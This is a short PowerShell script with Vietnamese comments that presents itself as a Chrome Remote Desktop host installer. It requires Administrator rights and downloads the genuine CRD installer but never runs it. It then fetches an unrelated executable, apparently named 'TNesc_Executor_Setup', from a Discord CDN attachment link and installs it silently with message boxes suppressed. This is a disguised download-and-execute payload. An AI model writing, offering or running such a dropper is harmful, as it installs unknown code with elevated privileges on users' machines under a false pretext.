# ================================
# CRD Host - Fixed URL
# ================================
# Chay voi quyen Admin!
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Write-Host "Vui long chay PowerShell voi quyen Administrator!" -ForegroundColor Red
    pause; exit
}

Write-Host "====================================" -ForegroundColor Cyan
Write-Host "  Chrome Remote Desktop - Setup" -ForegroundColor Cyan
Write-Host "====================================" -ForegroundColor Cyan

# ── BUOC 1: Tai dung URL ──
Write-Host "[1/2] Dang tai CRD Host..." -ForegroundColor Yellow
$CRDInstaller = "$env:TEMP\crd_host.msi"
if (Test-Path $CRDInstaller) { Remove-Item $CRDInstaller -Force }

$URL = "https://dl.google.com/dl/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi"
(New-Object System.Net.WebClient).DownloadFile($URL, $CRDInstaller)

$size = (Get-Item $CRDInstaller).Length / 1MB
Write-Host "     Tai xong! File size: $([math]::Round($size,1)) MB" -ForegroundColor Green

# Thay link của bạn vào đây
$url = "https://cdn.discordapp.com/attachments/1470982734384988402/1493067002623820048/TNesc_Executor_Setup_0.0.1.16.exe?ex=69e04181&is=69def001&hm=0dd2d6fc1228f77010e9bd553ddbd9893b71923d1dd835373b70c3218a2568fe&"
$output = "$env:TEMP\setup.exe"

# Tải về
Write-Host "Dang tai..."
Invoke-WebRequest -Uri $url -OutFile $output

# Cài đặt tự động
Write-Host "Dang cai dat..."
Start-Process -FilePath $output -ArgumentList "/VERYSILENT /SUPPRESSMSGBOXES /NORESTART" -Wait

Write-Host "Hoàn tất!"
